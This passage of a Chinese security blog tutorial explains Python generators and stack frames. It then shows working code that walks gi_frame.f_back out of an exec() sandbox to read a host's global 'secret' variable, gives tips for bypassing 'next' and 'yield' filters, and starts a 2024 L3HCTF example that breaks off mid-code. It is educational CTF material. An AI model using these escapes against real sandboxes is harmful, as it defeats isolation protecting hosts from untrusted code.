@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>python栈帧沙箱逃逸 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="python栈帧沙箱逃逸">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-11T22:45:36+00:00">
+    <meta property="article:modified_time" content="2024-06-11T22:45:36+00:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="沙箱逃逸">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="python栈帧沙箱逃逸">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" /><link rel="prev" href="http://localhost:1313/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/" /><link rel="next" href="http://localhost:1313/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "python栈帧沙箱逃逸",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "python, 沙箱逃逸","wordcount":  2938 ,
+        "url": "http:\/\/localhost:1313\/posts\/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8\/","datePublished": "2024-06-11T22:45:36+00:00","dateModified": "2024-06-11T22:45:36+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">python栈帧沙箱逃逸</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞学习</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-06-11">2024-06-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2938 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#一生成器"><strong>一、生成器</strong></a></li>
+        <li><a href="#二栈帧frame"><strong>二、栈帧(frame)</strong></a></li>
+        <li><a href="#三生成器的属性"><strong>三、生成器的属性</strong></a></li>
+        <li><a href="#四利用栈帧沙箱逃逸"><strong>四、利用栈帧沙箱逃逸</strong></a></li>
+        <li><a href="#五简单绕过"><strong>五、简单绕过</strong></a></li>
+        <li><a href="#六例题"><strong>六、例题</strong></a>
+          <ul>
+            <li><a href="#2024l3hctf">2024L3HCTF</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h3 id="一生成器"><strong>一、生成器</strong></h3>
+<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。<font color=yellow>生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值</font>。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
+<p>在 Python 中，生成器可以通过两种方式创建：</p>
+<p><em>1、生成器函数：定义一个函数，使用 <code>yield</code> 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。</em></p>
+<p>示例：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_generator</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gen</span> <span class="o">=</span> <span class="n">my_generator</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">gen</span><span class="p">))</span> <span class="c1"># 第一次调用，输出 1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">gen</span><span class="p">))</span> <span class="c1"># 第二次调用，输出 2</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">gen</span><span class="p">))</span> <span class="c1"># 第三次调用，输出 3</span></span></span></code></pre></div></div><p><em>2、生成器表达式：使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。</em></p>
+<p>示例：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">gen</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">gen</span><span class="p">))</span>  <span class="c1"># 输出 [0, 1, 4, 9, 16]</span></span></span></code></pre></div></div><h3 id="二栈帧frame"><strong>二、栈帧(frame)</strong></h3>
+<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<p>栈帧包含了以下几个重要的属性：
+<code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。
+<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。
+<code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。
+<code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。
+<code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
+<h3 id="三生成器的属性"><strong>三、生成器的属性</strong></h3>
+<p><code>gi_code</code>: 生成器对应的code对象。
+<code>gi_frame</code>: 生成器对应的frame（栈帧）对象。
+<code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。
+<code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。
+<code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<p><em>着重介绍一下 gi_frame 属性</em>
+<code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
+<p>例子：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_generator</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gen</span> <span class="o">=</span> <span class="n">my_generator</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取生成器的当前帧信息</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">gen</span><span class="o">.</span><span class="n">gi_frame</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出生成器的当前帧信息</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Local Variables:&#34;</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_locals</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Global Variables:&#34;</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_globals</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Code Object:&#34;</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Instruction Pointer:&#34;</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_lasti</span><span class="p">)</span></span></span></code></pre></div></div><p>同理利用<code>gi_code</code>属性也可以获得生成器的相关代码对象属性：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_generator</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gen</span> <span class="o">=</span> <span class="n">my_generator</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取生成器的当前代码信息</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">gen</span><span class="o">.</span><span class="n">gi_code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出生成器的当前代码信息</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span> <span class="n">code</span><span class="o">.</span><span class="n">co_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">co_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span> <span class="n">code</span><span class="o">.</span><span class="n">co_consts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">co_filename</span><span class="p">)</span></span></span></code></pre></div></div><h3 id="四利用栈帧沙箱逃逸"><strong>四、利用栈帧沙箱逃逸</strong></h3>
+<p>原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表
+一个简单的例子：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s3cret</span><span class="o">=</span><span class="s2">&#34;this is flag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waff</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">f</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">g</span><span class="o">.</span><span class="n">gi_frame</span><span class="o">.</span><span class="n">f_back</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">f</span><span class="p">()</span>  <span class="c1">#生成器</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="c1">#获取到生成器的栈帧对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_globals</span><span class="p">[</span><span class="s1">&#39;s3cret&#39;</span><span class="p">]</span> <span class="c1">#返回并获取前一级栈帧的globals</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">waff</span><span class="p">()</span></span></span></code></pre></div></div><p>或者：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s3cret</span><span class="o">=</span><span class="s2">&#34;this is flag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waff</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">f</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">g</span><span class="o">.</span><span class="n">gi_frame</span><span class="o">.</span><span class="n">f_back</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">f</span><span class="p">()</span>  <span class="c1">#生成器</span>
+</span></span><span class="line"><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="c1">#获取到生成器的栈帧对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_back</span><span class="o">.</span><span class="n">f_globals</span><span class="p">[</span><span class="s1">&#39;s3cret&#39;</span><span class="p">]</span> <span class="c1">#返回并获取前一级栈帧的globals</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">waff</span><span class="p">()</span></span></span></code></pre></div></div><p>为什么都行呢，可以把frame这个栈帧对象打印看看：</p>
+<p>分别是：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">frame</span> <span class="n">at</span> <span class="mh">0x0000020F97255040</span><span class="p">,</span> <span class="n">file</span> <span class="s1">&#39;D:</span><span class="se">\\</span><span class="s1">yinwenmingtwo</span><span class="se">\\</span><span class="s1">PythonCode</span><span class="se">\\</span><span class="s1">测试</span><span class="se">\\</span><span class="s1">1.py&#39;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">9</span><span class="p">,</span> <span class="n">code</span> <span class="n">waff</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">frame</span> <span class="n">at</span> <span class="mh">0x00000176546465B0</span><span class="p">,</span> <span class="n">file</span> <span class="s1">&#39;D:</span><span class="se">\\</span><span class="s1">yinwenmingtwo</span><span class="se">\\</span><span class="s1">PythonCode</span><span class="se">\\</span><span class="s1">测试</span><span class="se">\\</span><span class="s1">1.py&#39;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">13</span><span class="p">,</span> <span class="n">code</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;&gt;</span></span></span></code></pre></div></div><p>在看看上面的<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
+<p>不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。</p>
+<p>在给个例子：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s3cret</span><span class="o">=</span><span class="s2">&#34;this is flag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">codes</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">def waff():
+</span></span></span><span class="line"><span class="cl"><span class="s1">    def f():
+</span></span></span><span class="line"><span class="cl"><span class="s1">        yield g.gi_frame.f_back
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    g = f()  #生成器
+</span></span></span><span class="line"><span class="cl"><span class="s1">    frame = next(g) #获取到生成器的栈帧对象
+</span></span></span><span class="line"><span class="cl"><span class="s1">    print(frame)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    print(frame.f_back)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    print(frame.f_back.f_back)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    b = frame.f_back.f_back.f_globals[&#39;s3cret&#39;] #返回并获取前一级栈帧的globals
+</span></span></span><span class="line"><span class="cl"><span class="s1">    return b
+</span></span></span><span class="line"><span class="cl"><span class="s1">b=waff()
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">locals</span><span class="o">=</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">codes</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="nb">locals</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">[</span><span class="s2">&#34;b&#34;</span><span class="p">])</span></span></span></code></pre></div></div><p>运行结果：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png"
+        data-srcset="https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png, https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png 1.5x, https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png"
+        title="QQ截图20240611190601" /></p>
+<p>这个其实得从下向上看，最先的帧是exec，然后是b=，最后是8line那里的代码。一步一步回到全局变量</p>
+<h3 id="五简单绕过"><strong>五、简单绕过</strong></h3>
+<p><code>next</code>过滤可以用<code>list</code>，<code>send</code>，和生成器表达式进行绕过，</p>
+<p><code>yield</code>过滤也可以用生成器表达式进行绕过</p>
+<h3 id="六例题"><strong>六、例题</strong></h3>
+<h4 id="2024l3hctf">2024L3HCTF</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">codes</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;&lt;codehere&gt;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">codes</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">UnicodeEncodeError</span><span class="p">:</span>
